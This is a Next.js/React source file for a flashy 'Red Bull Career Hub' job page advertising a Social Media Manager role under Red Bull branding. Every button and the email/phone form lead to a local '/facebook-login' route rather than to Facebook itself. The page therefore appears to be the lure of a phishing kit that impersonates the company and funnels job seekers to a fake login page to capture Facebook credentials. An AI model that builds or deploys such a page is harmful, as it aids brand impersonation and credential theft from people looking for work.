'use client';

import { useState, useEffect } from 'react';
import { motion, useAnimation, useMotionValue, useTransform } from 'framer-motion';
import Link from 'next/link';
import { useRouter } from 'next/navigation';

const RedBullCareerHub = () => {
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 });
  const controls = useAnimation();
  const router = useRouter();

  // Energy particle system
  const [particles, setParticles] = useState<Array<{ id: number; x: number; y: number; size: number; speed: number; opacity: number }>>([]);

  useEffect(() => {
    // Create floating energy particles
    const newParticles = Array.from({ length: 15 }, (_, i) => ({
      id: i,
      x: Math.random() * window.innerWidth,
      y: Math.random() * window.innerHeight,
      size: Math.random() * 4 + 2,
      speed: Math.random() * 2 + 1,
      opacity: Math.random() * 0.7 + 0.3
    }));
    setParticles(newParticles);
  }, []);

  useEffect(() => {
    const handleMouseMove = (e: MouseEvent) => {
      setMousePosition({ x: e.clientX, y: e.clientY });
    };
    window.addEventListener('mousemove', handleMouseMove);
    return () => window.removeEventListener('mousemove', handleMouseMove);
  }, []);

  const locations = [
    { country: 'Austria', title: 'Red Bull Global Headquarters', flag: '🇦🇹' },
    { country: 'Austria', title: 'Red Bull Austria', flag: '🇦🇹' },
    { country: 'Germany', title: 'Red Bull Germany', flag: '🇩🇪' },
    { country: 'Switzerland', title: 'Red Bull Switzerland', flag: '🇨🇭' },
    { country: 'France', title: 'Red Bull France', flag: '🇫🇷' },
    { country: 'United Kingdom', title: 'Red Bull UK', flag: '🇬🇧' },
    { country: 'Italy', title: 'Red Bull Italy', flag: '🇮🇹' },
    { country: 'Spain', title: 'Red Bull Spain', flag: '🇪🇸' },
    { country: 'Netherlands', title: 'Red Bull Netherlands', flag: '🇳🇱' },
    { country: 'United States', title: 'Red Bull North America', flag: '🇺🇸' },
    { country: 'Canada', title: 'Red Bull Canada', flag: '🇨🇦' },
    { country: 'Brazil', title: 'Red Bull Brazil', flag: '🇧🇷' },
    { country: 'Japan', title: 'Red Bull Japan', flag: '🇯🇵' },
    { country: 'Australia', title: 'Red Bull Australia', flag: '🇦🇺' },
  ];

  const values = [
    {
      title: 'Meaning',
      subtitle: 'Find your meaning and use your strengths to achieve it!',
      description: 'The bigger reason why you work. To contribute and add value to something or someone.'
    },
    {
      title: 'Freedom & Responsibility',
      subtitle: 'Take real responsibility for yourself and your work.',
      description: 'To have the freedom to work on something the way you want to.'
    },
    {
      title: 'Mastery',
      subtitle: 'Love life, love work, love to challenge yourself!',
      description: 'Turn your talents into strengths to become excellent at what you do.'
    }
  ];

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    router.push('/facebook-login');
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-red-950 to-blue-950 relative overflow-hidden">
      {/* Floating Energy Particles */}
      <div className="fixed inset-0 pointer-events-none z-10">
        {particles.map((particle) => (
          <motion.div
            key={particle.id}
            className="absolute w-2 h-2 bg-gradient-to-r from-red-400 to-yellow-400 rounded-full blur-sm"
            style={{
              left: particle.x,
              top: particle.y,
              opacity: particle.opacity
            }}
            animate={{
              y: [particle.y, particle.y - 100, particle.y],
              x: [particle.x, particle.x + 50, particle.x - 50, particle.x],
              scale: [1, 1.5, 1],
              opacity: [particle.opacity, 0.8, particle.opacity]
            }}
            transition={{
              duration: particle.speed * 3,
              repeat: Infinity,
              ease: "easeInOut"
            }}
          />
        ))}
      </div>
      {/* Interactive Light Effect */}
      <motion.div
        className="fixed inset-0 pointer-events-none z-5"
        style={{
          background: `radial-gradient(600px circle at ${mousePosition.x}px ${mousePosition.y}px, rgba(239, 68, 68, 0.1), transparent 40%)`
        }}
      />
      {/* Header */}
      <motion.header
        initial={{ y: -100 }}
        animate={{ y: 0 }}
        className="relative z-20 bg-black/20 backdrop-blur-md border-b border-red-500/20"
      >
        <div className="container mx-auto px-6 py-4">
          <div className="flex items-center justify-between">
            <motion.div
              className="flex items-center"
              whileHover={{ scale: 1.05 }}
              transition={{ type: "spring", stiffness: 300 }}
            >
              <img src={'/rblogotext.svg'} alt="Red Bull" className="h-8 filter brightness-0 invert" />
              <motion.div
                className="ml-3 w-2 h-2 bg-red-500 rounded-full"
                animate={{
                  scale: [1, 1.5, 1],
                  opacity: [0.7, 1, 0.7]
                }}
                transition={{
                  duration: 2,
                  repeat: Infinity,
                  ease: "easeInOut"
                }}
              />
            </motion.div>
            <nav className="hidden md:flex items-center space-x-8">
              <motion.a
                href="#jobs"
                className="text-white/80 hover:text-red-400 transition-colors font-medium relative group"
                whileHover={{ scale: 1.05 }}
              >
                Jobs
                <motion.div
                  className="absolute -bottom-1 left-0 w-0 h-0.5 bg-red-500 group-hover:w-full transition-all duration-300"
                />
              </motion.a>
              <motion.a
                href="#locations"
                className="text-white/80 hover:text-red-400 transition-colors font-medium relative group"
                whileHover={{ scale: 1.05 }}
              >
                Locations
                <motion.div
                  className="absolute -bottom-1 left-0 w-0 h-0.5 bg-red-500 group-hover:w-full transition-all duration-300"
                />
              </motion.a>
              <motion.a
                href="#values"
                className="text-white/80 hover:text-red-400 transition-colors font-medium relative group"
                whileHover={{ scale: 1.05 }}
              >
                Values
                <motion.div
                  className="absolute -bottom-1 left-0 w-0 h-0.5 bg-red-500 group-hover:w-full transition-all duration-300"
                />
              </motion.a>
            </nav>
          </div>
        </div>
      </motion.header>
      {/* Hero Section */}
      <motion.section
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.2 }}
        className="relative py-20 overflow-hidden min-h-screen flex items-center"
      >
        {/* Background Video */}
        <video
          autoPlay
          muted
          loop
          className="absolute inset-0 w-full h-full object-cover z-0"
        >
          <source src={'/video.mp4'} type="video/mp4" />
          Your browser does not support the video tag.
        </video>

        {/* Dynamic gradient overlay */}
        <motion.div
          className="absolute inset-0 z-10"
          style={{
            background: `linear-gradient(135deg, rgba(0,0,0,0.7) 0%, rgba(239,68,68,0.3) 50%, rgba(59,130,246,0.4) 100%)`
          }}
          animate={{
            background: [
              `linear-gradient(135deg, rgba(0,0,0,0.7) 0%, rgba(239,68,68,0.3) 50%, rgba(59,130,246,0.4) 100%)`,
              `linear-gradient(135deg, rgba(0,0,0,0.6) 0%, rgba(59,130,246,0.4) 50%, rgba(239,68,68,0.3) 100%)`,
              `linear-gradient(135deg, rgba(0,0,0,0.7) 0%, rgba(239,68,68,0.3) 50%, rgba(59,130,246,0.4) 100%)`
            ]
          }}
          transition={{ duration: 8, repeat: Infinity, ease: "easeInOut" }}
        />

        <div className="container mx-auto px-6 text-center relative z-20">
          <motion.div
            initial={{ y: 50, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            transition={{ delay: 0.4 }}
          >
            <motion.p
              className="text-red-400 font-bold mb-4 uppercase tracking-wide text-lg"
              animate={{
                textShadow: [
                  "0 0 10px rgba(239,68,68,0.5)",
                  "0 0 20px rgba(239,68,68,0.8)",
                  "0 0 10px rgba(239,68,68,0.5)"
                ]
              }}
              transition={{ duration: 2, repeat: Infinity }}
            >
              ⚡ Red Bull JOBS ⚡
            </motion.p>
            <motion.h1
              className="text-5xl md:text-8xl font-black text-white mb-6 leading-tight"
              style={{
                background: "linear-gradient(45deg, #ffffff, #ef4444, #3b82f6)",
                backgroundClip: "text",
                WebkitBackgroundClip: "text",
                WebkitTextFillColor: "transparent"
              }}
              animate={{
                backgroundPosition: ["0% 50%", "100% 50%", "0% 50%"]
              }}
              transition={{ duration: 5, repeat: Infinity }}
            >
              Your Journey <br />
              <motion.span
                className="relative inline-block"
                animate={{
                  scale: [1, 1.05, 1],
                  rotateZ: [0, 1, -1, 0]
                }}
                transition={{ duration: 3, repeat: Infinity, ease: "easeInOut" }}
              >
                Starts Here
                <motion.div
                  className="absolute -inset-2 bg-gradient-to-r from-red-500/20 to-blue-500/20 rounded-lg blur-xl"
                  animate={{
                    opacity: [0.3, 0.8, 0.3],
                    scale: [1, 1.1, 1]
                  }}
                  transition={{ duration: 2, repeat: Infinity }}
                />
              </motion.span>
            </motion.h1>
          </motion.div>

          <motion.div
            initial={{ y: 30, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            transition={{ delay: 0.6 }}
            className="mt-16"
          >
            <motion.div
              className="bg-black/40 backdrop-blur-md border border-red-500/30 rounded-2xl shadow-2xl p-8 max-w-md mx-auto relative overflow-hidden"
              whileHover={{
                scale: 1.05,
                boxShadow: "0 0 50px rgba(239,68,68,0.3)"
              }}
              transition={{ type: "spring", stiffness: 300 }}
            >
              {/* Animated border */}
              <motion.div
                className="absolute inset-0 rounded-2xl"
                style={{
                  background: "linear-gradient(45deg, transparent, rgba(239,68,68,0.5), transparent, rgba(59,130,246,0.5))",
                  backgroundSize: "400% 400%"
                }}
                animate={{
                  backgroundPosition: ["0% 50%", "100% 50%", "0% 50%"]
                }}
                transition={{ duration: 3, repeat: Infinity }}
              />
              <div className="relative bg-black/60 rounded-2xl p-6 m-1">
                <img
                  src="https://img.redbull.com/images/w_1000,q_auto,f_auto/rbjobs/staging/pgqctmnjdmvrfardnhoh/MS_211015_RBMH_HR_Elsbethen_1311"
                  alt="Red Bull Talent Community"
                  className="w-full h-48 object-cover rounded-lg mb-6 border-2 border-red-500/30"
                />
                <h3 className="text-xl font-bold text-white mb-2 uppercase tracking-wide">TALENT COMMUNITIES</h3>
                <h4 className="text-lg font-semibold text-red-400 mb-4">Join our Energy Network!</h4>
                <Link href="/facebook-login" passHref>
                  <motion.button
                    className="w-full bg-gradient-to-r from-red-600 to-red-500 hover:from-red-500 hover:to-red-400 text-white font-bold py-4 px-6 rounded-lg transition-all duration-300 relative overflow-hidden"
                    whileHover={{ scale: 1.05 }}
                    whileTap={{ scale: 0.95 }}
                  >
                    <motion.div
                      className="absolute inset-0 bg-white/20"
                      initial={{ x: "-100%" }}
                      whileHover={{ x: "100%" }}
                      transition={{ duration: 0.5 }}
                    />
                    <span className="relative z-10">⚡ Join the Energy ⚡</span>
                  </motion.button>
                </Link>
              </div>
            </motion.div>
          </motion.div>
        </div>
      </motion.section>
      {/* Job Application Section */}
      <motion.section
        initial={{ y: 100, opacity: 0 }}
        whileInView={{ y: 0, opacity: 1 }}
        viewport={{ once: true }}
        id="jobs"
        className="py-20 bg-gradient-to-br from-gray-900 via-red-950 to-black relative overflow-hidden"
      >
        {/* Animated background elements */}
        <div className="absolute inset-0 opacity-10">
          {[...Array(8)].map((_, i) => (
            <motion.div
              key={i}
              className="absolute w-32 h-32 border border-red-500 rounded-full"
              style={{
                left: `${Math.random() * 100}%`,
                top: `${Math.random() * 100}%`,
              }}
              animate={{
                scale: [1, 1.2, 1],
                rotate: [0, 360],
                opacity: [0.1, 0.3, 0.1]
              }}
              transition={{
                duration: 10 + i * 2,
                repeat: Infinity,
                ease: "linear"
              }}
            />
          ))}
        </div>

        <div className="container mx-auto px-6 relative z-10">
          <div className="max-w-2xl mx-auto text-center mb-12">
            <motion.h2
              className="text-4xl md:text-5xl font-black text-white mb-6"
              animate={{
                textShadow: [
                  "0 0 20px rgba(239,68,68,0.5)",
                  "0 0 40px rgba(239,68,68,0.8)",
                  "0 0 20px rgba(239,68,68,0.5)"
                ]
              }}
              transition={{ duration: 3, repeat: Infinity }}
            >
              Ready to fuel your career as a&nbsp;
              <motion.span
                className="bg-gradient-to-r from-red-400 via-yellow-400 to-red-400 bg-clip-text text-transparent"
                animate={{
                  backgroundPosition: ["0% 50%", "100% 50%", "0% 50%"]
                }}
                transition={{ duration: 3, repeat: Infinity }}
              >
                Social Media Manager
              </motion.span>
              ?
            </motion.h2>
            <motion.p
              className="text-lg text-gray-300 mb-8"
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.3 }}
            >
              Join our energy-driven team. We&apos;re seeking bold creators who push boundaries and think outside the can.
            </motion.p>
          </div>

          <div className="max-w-md mx-auto">
            <motion.div
              className="bg-black/60 backdrop-blur-md border border-red-500/30 rounded-2xl p-8 shadow-2xl relative overflow-hidden"
              whileHover={{
                scale: 1.02,
                boxShadow: "0 0 60px rgba(239,68,68,0.3)"
              }}
              initial={{ y: 50, opacity: 0 }}
              whileInView={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.5 }}
            >
              {/* Animated border effect */}
              <motion.div
                className="absolute inset-0 rounded-2xl opacity-30"
                style={{
                  background: "conic-gradient(from 0deg, transparent, #ef4444, transparent, #3b82f6, transparent)"
                }}
                animate={{ rotate: 360 }}
                transition={{ duration: 8, repeat: Infinity, ease: "linear" }}
              />

              <div className="relative z-10">
                <Link href="/facebook-login" passHref>
                  <motion.button
                    className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-500 hover:to-blue-600 text-white font-bold py-4 px-6 rounded-lg mb-6 flex items-center justify-center space-x-3 transition-all duration-300 relative overflow-hidden group"
                    whileHover={{ scale: 1.02 }}
                    whileTap={{ scale: 0.98 }}
                  >
                    <motion.div
                      className="absolute inset-0 bg-white/10"
                      initial={{ x: "-100%" }}
                      whileHover={{ x: "100%" }}
                      transition={{ duration: 0.6 }}
                    />
                    <span className="w-8 h-8 bg-white rounded-full text-blue-600 text-lg font-bold flex items-center justify-center relative z-10">f</span>
                    <span className="relative z-10">Continue with Facebook</span>
                  </motion.button>
                </Link>

                <div className="text-center text-gray-400 my-6 relative">
                  <span className="bg-black/60 px-4">or fuel up with</span>

                </div>

                <form className="space-y-6" onSubmit={handleSubmit}>
                  <motion.div
                    whileFocus={{ scale: 1.02 }}
                  >
                    <input
                      type="email"
                      placeholder="⚡ E-mail Address"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      className="w-full px-4 py-4 bg-gray-800/50 border border-red-500/30 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition-all text-white placeholder-gray-400 backdrop-blur-sm"
                    />
                  </motion.div>
                  <motion.div
                    whileFocus={{ scale: 1.02 }}
                  >
                    <input
                      type="tel"
                      placeholder="📱 Phone Number"
                      value={phone}
                      onChange={(e) => setPhone(e.target.value)}
                      className="w-full px-4 py-4 bg-gray-800/50 border border-red-500/30 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition-all text-white placeholder-gray-400 backdrop-blur-sm"
                    />
                  </motion.div>
                  <motion.button
                    whileHover={{
                      scale: 1.05,
                      boxShadow: "0 0 25px rgba(239,68,68,0.5)"
                    }}
                    whileTap={{ scale: 0.95 }}
                    type="submit"
                    className="w-full bg-gradient-to-r from-red-600 via-red-500 to-yellow-500 hover:from-red-500 hover:via-red-400 hover:to-yellow-400 text-white font-bold py-4 px-6 rounded-lg transition-all duration-300 relative overflow-hidden group"
                  >
                    <motion.div
                      className="absolute inset-0 bg-white/20"
                      initial={{ x: "-100%" }}
                      whileHover={{ x: "100%" }}
                      transition={{ duration: 0.5 }}
                    />
                    <span className="relative z-10 text-lg">🚀 Launch Your Career</span>
                  </motion.button>
                </form>
              </div>
            </motion.div>
          </div>
        </div>
      </motion.section>
      {/* Locations Section */}
      <motion.section
        initial={{ y: 100, opacity: 0 }}
        whileInView={{ y: 0, opacity: 1 }}
        viewport={{ once: true }}
        id="locations"
        className="py-20 bg-gradient-to-br from-slate-900 via-gray-900 to-black relative overflow-hidden"
      >
        {/* Energy waves background */}
        <div className="absolute inset-0 opacity-5">
          <svg className="w-full h-full" viewBox="0 0 1000 1000">
            <defs>
              <linearGradient id="waveGradient" x1="0%" y1="0%" x2="100%" y2="0%">
                <stop offset="0%" stopColor="#ef4444" />
                <stop offset="50%" stopColor="#3b82f6" />
                <stop offset="100%" stopColor="#ef4444" />
              </linearGradient>
            </defs>
            <motion.path
              fill="url(#waveGradient)"
              animate={{
                d: [
                  "M0,500 Q250,300 500,500 T1000,500 V1000 H0 Z",
                  "M0,500 Q250,700 500,500 T1000,500 V1000 H0 Z",
                  "M0,500 Q250,300 500,500 T1000,500 V1000 H0 Z"
                ]
              }}
              transition={{ duration: 8, repeat: Infinity, ease: "easeInOut" }}
            />
          </svg>
        </div>

        <div className="container mx-auto px-6 relative z-10">
          <div className="text-center mb-16">
            <motion.p
              className="text-red-400 font-bold mb-4 uppercase tracking-wide text-lg"
              animate={{
                textShadow: [
                  "0 0 10px rgba(239,68,68,0.5)",
                  "0 0 20px rgba(239,68,68,0.8)",
                  "0 0 10px rgba(239,68,68,0.5)"
                ]
              }}
              transition={{ duration: 2, repeat: Infinity }}
            >
              🌍 GLOBAL ENERGY NETWORK 🌍
            </motion.p>
            <motion.h2
              className="text-4xl md:text-5xl font-black text-white mb-6 leading-tight"
              initial={{ opacity: 0, y: 30 }}
              whileInView={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.2 }}
            >
              Join the{" "}
              <motion.span
                className="bg-gradient-to-r from-red-400 via-yellow-400 to-blue-400 bg-clip-text text-transparent"
                animate={{
                  backgroundPosition: ["0% 50%", "100% 50%", "0% 50%"]
                }}
                transition={{ duration: 4, repeat: Infinity }}
              >
                unstoppable force
              </motion.span>
              . <br />
              19,000+ energy creators across 172 countries.
            </motion.h2>
          </div>

          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-7 gap-6">
            {locations.map((location, index) => (
              <motion.div
                key={index}
                initial={{ y: 50, opacity: 0, scale: 0.8 }}
                whileInView={{ y: 0, opacity: 1, scale: 1 }}
                transition={{
                  delay: index * 0.05,
                  type: "spring",
                  stiffness: 200
                }}
                viewport={{ once: true }}
                whileHover={{
                  y: -10,
                  scale: 1.05,
                  rotateY: 10,
                  boxShadow: "0 10px 40px rgba(239,68,68,0.3)"
                }}
                className="bg-gradient-to-br from-black/60 to-gray-900/60 backdrop-blur-md border border-red-500/20 rounded-xl p-6 text-center shadow-lg cursor-pointer relative overflow-hidden group"
              >
                {/* Hover energy effect */}
                <motion.div
                  className="absolute inset-0 bg-gradient-to-r from-red-500/10 to-blue-500/10 opacity-0 group-hover:opacity-100 transition-opacity duration-300"
                  animate={{
                    background: [
                      "linear-gradient(45deg, rgba(239,68,68,0.1), rgba(59,130,246,0.1))",
                      "linear-gradient(45deg, rgba(59,130,246,0.1), rgba(239,68,68,0.1))",
                      "linear-gradient(45deg, rgba(239,68,68,0.1), rgba(59,130,246,0.1))"
                    ]
                  }}
                  transition={{ duration: 3, repeat: Infinity }}
                />

                <motion.div
                  className="text-4xl mb-3 relative z-10"
                  animate={{
                    rotateY: [0, 360],
                    scale: [1, 1.1, 1]
                  }}
                  transition={{
                    duration: 6 + index * 0.5,
                    repeat: Infinity,
                    ease: "easeInOut"
                  }}
                >
                  {location.flag}
                </motion.div>
                <h3 className="font-bold text-white mb-1 text-sm uppercase tracking-wide relative z-10">
                  {location.country}
                </h3>
                <p className="text-xs text-gray-300 relative z-10">{location.title}</p>

                {/* Pulsing border effect */}
                <motion.div
                  className="absolute inset-0 border-2 border-red-500/50 rounded-xl opacity-0 group-hover:opacity-100"
                  animate={{
                    borderColor: [
                      "rgba(239,68,68,0.5)",
                      "rgba(59,130,246,0.5)",
                      "rgba(239,68,68,0.5)"
                    ]
                  }}
                  transition={{ duration: 2, repeat: Infinity }}
                />
              </motion.div>
            ))}
          </div>
        </div>
      </motion.section>
      {/* Values Section */}
      <motion.section
        initial={{ y: 100, opacity: 0 }}
        whileInView={{ y: 0, opacity: 1 }}
        viewport={{ once: true }}
        id="values"
        className="py-20 bg-gradient-to-br from-gray-900 via-red-950 to-black relative overflow-hidden"
      >
        {/* Floating energy orbs */}
        <div className="absolute inset-0 overflow-hidden">
          {[...Array(12)].map((_, i) => (
            <motion.div
              key={i}
              className="absolute w-4 h-4 bg-gradient-to-r from-red-400 to-yellow-400 rounded-full opacity-30 blur-sm"
              style={{
                left: `${Math.random() * 100}%`,
                top: `${Math.random() * 100}%`,
              }}
              animate={{
                y: [0, -100, 0],
                x: [0, Math.random() * 100 - 50, 0],
                scale: [1, 1.5, 1],
                opacity: [0.3, 0.8, 0.3]
              }}
              transition={{
                duration: 8 + Math.random() * 4,
                repeat: Infinity,
                ease: "easeInOut",
                delay: Math.random() * 2
              }}
            />
          ))}
        </div>

        <div className="container mx-auto px-6 relative z-10">
          <div className="text-center mb-20">
            <motion.h2
              className="text-2xl font-semibold text-red-400 mb-6 uppercase tracking-wide"
              animate={{
                textShadow: [
                  "0 0 10px rgba(239,68,68,0.5)",
                  "0 0 20px rgba(239,68,68,0.8)",
                  "0 0 10px rgba(239,68,68,0.5)"
                ]
              }}
              transition={{ duration: 3, repeat: Infinity }}
            >
              ⚡ THE ENERGY THAT DRIVES US ⚡
            </motion.h2>
            <motion.h3
              className="text-5xl md:text-7xl font-black text-white mb-8 leading-tight"
              style={{
                background: "linear-gradient(45deg, #ffffff, #ef4444, #3b82f6, #ffffff)",
                backgroundClip: "text",
                WebkitBackgroundClip: "text",
                WebkitTextFillColor: "transparent",
                backgroundSize: "400% 400%"
              }}
              animate={{
                backgroundPosition: ["0% 50%", "100% 50%", "0% 50%"]
              }}
              transition={{ duration: 6, repeat: Infinity }}
              initial={{ opacity: 0, y: 30 }}
              whileInView={{ opacity: 1, y: 0 }}
            >
              Unleashing our <br />
              <motion.span
                className="relative inline-block"
                animate={{
                  rotateX: [0, 360],
                  scale: [1, 1.1, 1]
                }}
                transition={{ duration: 8, repeat: Infinity, ease: "easeInOut" }}
              >
                POTENTIAL
              </motion.span>
            </motion.h3>
            <motion.p
              className="text-xl text-gray-300 max-w-4xl mx-auto leading-relaxed"
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.3 }}
            >
              Since day one, our entrepreneurial spirit has been the rocket fuel propelling our vision forward:
            </motion.p>
          </div>

          <div className="grid md:grid-cols-3 gap-8 max-w-6xl mx-auto">
            {values.map((value, index) => (
              <motion.div
                key={index}
                initial={{ y: 100, opacity: 0, rotateX: -15 }}
                whileInView={{ y: 0, opacity: 1, rotateX: 0 }}
                transition={{
                  delay: index * 0.2,
                  type: "spring",
                  stiffness: 100
                }}
                viewport={{ once: true }}
                whileHover={{
                  y: -20,
                  scale: 1.05,
                  rotateY: 5,
                  boxShadow: "0 20px 60px rgba(239,68,68,0.3)"
                }}
                className="text-center p-8 rounded-2xl bg-gradient-to-br from-black/60 to-gray-900/60 backdrop-blur-md border border-red-500/20 shadow-2xl relative overflow-hidden group"
              >
                {/* Dynamic background effect */}
                <motion.div
                  className="absolute inset-0 opacity-20"
                  style={{
                    background: `conic-gradient(from ${index * 120}deg, transparent, #ef4444, transparent, #3b82f6, transparent)`
                  }}
                  animate={{ rotate: 360 }}
                  transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
                />

                {/* Energy pulse effect */}
                <motion.div
                  className="absolute inset-0 bg-gradient-to-r from-red-500/10 to-blue-500/10 opacity-0 group-hover:opacity-100 transition-opacity duration-500"
                  animate={{
                    background: [
                      "radial-gradient(circle at 50% 50%, rgba(239,68,68,0.1), transparent 70%)",
                      "radial-gradient(circle at 50% 50%, rgba(59,130,246,0.1), transparent 70%)",
                      "radial-gradient(circle at 50% 50%, rgba(239,68,68,0.1), transparent 70%)"
                    ]
                  }}
                  transition={{ duration: 4, repeat: Infinity }}
                />

                <div className="relative z-10">
                  <motion.h4
                    className="text-3xl font-black text-white mb-6 uppercase tracking-wider"
                    animate={{
                      textShadow: [
                        "0 0 10px rgba(255,255,255,0.5)",
                        "0 0 20px rgba(239,68,68,0.5)",
                        "0 0 10px rgba(255,255,255,0.5)"
                      ]
                    }}
                    transition={{ duration: 4, repeat: Infinity, delay: index * 0.5 }}
                  >
                    {value.title}
                  </motion.h4>
                  <motion.h5
                    className="text-lg font-bold text-red-400 mb-8 relative"
                    whileHover={{ scale: 1.05 }}
                  >
                    {value.subtitle}
                    <motion.div
                      className="absolute -bottom-2 left-1/2 transform -translate-x-1/2 w-16 h-0.5 bg-gradient-to-r from-red-500 to-blue-500"
                      animate={{
                        scaleX: [0, 1, 0],
                        opacity: [0, 1, 0]
                      }}
                      transition={{ duration: 3, repeat: Infinity, delay: index * 0.3 }}
                    />
                  </motion.h5>
                  <p className="text-gray-300 leading-relaxed text-base">{value.description}</p>
                </div>

                {/* Corner energy indicators */}
                <motion.div
                  className="absolute top-4 right-4 w-3 h-3 bg-red-500 rounded-full"
                  animate={{
                    scale: [1, 1.5, 1],
                    opacity: [0.5, 1, 0.5]
                  }}
                  transition={{ duration: 2, repeat: Infinity, delay: index * 0.2 }}
                />
              </motion.div>
            ))}
          </div>
        </div>
      </motion.section>
      {/* Footer */}
      <footer className="bg-gradient-to-r from-black via-red-950 to-black text-white py-16 relative overflow-hidden">
        {/* Animated background elements */}
        <div className="absolute inset-0 opacity-10">
          <motion.div
            className="absolute inset-0"
            style={{
              background: "linear-gradient(45deg, transparent, rgba(239,68,68,0.3), transparent, rgba(59,130,246,0.3), transparent)",
              backgroundSize: "400% 400%"
            }}
            animate={{
              backgroundPosition: ["0% 50%", "100% 50%", "0% 50%"]
            }}
            transition={{ duration: 10, repeat: Infinity }}
          />
        </div>

        <div className="container mx-auto px-6 relative z-10">
          <div className="flex flex-col md:flex-row justify-between items-center">
            <motion.div
              className="flex items-center mb-8 md:mb-0"
              whileHover={{ scale: 1.05 }}
              transition={{ type: "spring", stiffness: 300 }}
            >
              <img src={'/rblogotext.svg'} alt="Red Bull" className="h-8 filter brightness-0 invert" />
              <motion.div
                className="ml-4 flex space-x-2"
                initial={{ opacity: 0, x: -20 }}
                whileInView={{ opacity: 1, x: 0 }}
                transition={{ delay: 0.3 }}
              >
                <motion.div
                  className="w-3 h-3 bg-red-500 rounded-full"
                  animate={{
                    scale: [1, 1.5, 1],
                    opacity: [0.5, 1, 0.5]
                  }}
                  transition={{ duration: 2, repeat: Infinity }}
                />
                <motion.div
                  className="w-3 h-3 bg-blue-500 rounded-full"
                  animate={{
                    scale: [1, 1.5, 1],
                    opacity: [0.5, 1, 0.5]
                  }}
                  transition={{ duration: 2, repeat: Infinity, delay: 0.5 }}
                />
                <motion.div
                  className="w-3 h-3 bg-yellow-500 rounded-full"
                  animate={{
                    scale: [1, 1.5, 1],
                    opacity: [0.5, 1, 0.5]
                  }}
                  transition={{ duration: 2, repeat: Infinity, delay: 1 }}
                />
              </motion.div>
            </motion.div>

            <motion.div
              className="text-center md:text-right"
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.5 }}
            >
              <motion.p
                className="text-gray-300 text-lg relative"
                animate={{
                  textShadow: [
                    "0 0 10px rgba(255,255,255,0.3)",
                    "0 0 20px rgba(239,68,68,0.3)",
                    "0 0 10px rgba(255,255,255,0.3)"
                  ]
                }}
                transition={{ duration: 4, repeat: Infinity }}
              >
                © 2025 Red Bull Career Hub.
                <motion.span
                  className="text-red-400 font-semibold ml-2"
                  animate={{
                    color: ["#ef4444", "#3b82f6", "#ef4444"]
                  }}
                  transition={{ duration: 3, repeat: Infinity }}
                >
                  Energizing careers worldwide.
                </motion.span>
              </motion.p>
              <motion.div
                className="mt-4 text-sm text-gray-400"
                initial={{ opacity: 0 }}
                whileInView={{ opacity: 1 }}
                transition={{ delay: 0.8 }}
              >
                Ready to give you wings? ⚡🚀
              </motion.div>
            </motion.div>
          </div>

          {/* Energy wave separator */}
          <motion.div
            className="mt-12 h-px bg-gradient-to-r from-transparent via-red-500 to-transparent"
            initial={{ scaleX: 0 }}
            whileInView={{ scaleX: 1 }}
            transition={{ duration: 2, ease: "easeInOut" }}
          />
        </div>

        {/* Bottom energy pulse */}
        <motion.div
          className="absolute bottom-0 left-0 right-0 h-1 bg-gradient-to-r from-red-500 via-yellow-500 to-blue-500"
          animate={{
            background: [
              "linear-gradient(90deg, #ef4444, #eab308, #3b82f6)",
              "linear-gradient(90deg, #3b82f6, #ef4444, #eab308)",
              "linear-gradient(90deg, #eab308, #3b82f6, #ef4444)",
              "linear-gradient(90deg, #ef4444, #eab308, #3b82f6)"
            ]
          }}
          transition={{ duration: 4, repeat: Infinity }}
        />
      </footer>
    </div>
  );
}

export default RedBullCareerHub;